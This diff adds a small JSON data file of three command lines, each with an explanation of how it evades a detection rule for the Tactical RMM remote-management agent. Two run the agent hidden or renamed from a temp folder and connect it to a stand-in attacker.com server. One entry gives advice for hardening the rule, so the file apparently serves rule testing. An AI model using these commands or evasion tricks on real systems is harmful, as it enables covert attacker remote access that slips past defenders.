@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Start-Process 'C:\\TacticalAgent\\tacticalrmm.exe' -ArgumentList '--api=[https://attacker.com](https://attacker.com)','--auth=token','--client-id=1','--site-id=2','--agent-type=mesh' -WindowStyle Hidden\"",
+    "explanation": "This demonstrates a potential operational bypass context if the SIEM rule parses arguments purely from a monolithic command line string without normalizing token delimiters. However, tacticalrmm.exe relies natively on these flags during programmatic CLI setup; to strictly evade static 'contains|all' matches on the command line string, parameters can instead be supplied via an external configuration file or interactive answer file if supported by the binary's architecture, thereby stripping the arguments from the process creation event."
+  },
+  {
+    "output": "copy C:\\TacticalAgent\\tacticalrmm.exe C:\\Windows\\Temp\\not_rmm.exe && C:\\Windows\\Temp\\not_rmm.exe --api [https://attacker.com](https://attacker.com) --auth token --client-id 1 --site-id 2 --agent-type mesh",
+    "explanation": "The detection rule strictly evaluates whether the 'Image' path contains the specific literal string '\\TacticalAgent\\tacticalrmm.exe'. Moving or copying the executable to an alternative temporary directory and renaming it completely breaks the 'Image' match path requirement, causing the selection logic to evaluate as false regardless of the command line arguments used."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\tacticalrmm.exe --api https://rmm.example.com --auth token123 --client-id 1 --site-id 1 --agent-type workstation",
+    "explanation": "This command bypasses the rule because the detection logic relies on a strict path match ('\\TacticalAgent\\tacticalrmm.exe') in the Image field. By moving or renaming the parent directory and executing the binary from an alternate location like C:\\Windows\\Temp\\, the Image condition evaluates to false. To improve this rule, defenders should incorporate file hashes (Hashes) or the OriginalFileName field instead of relying solely on the directory path."
+  }
+]
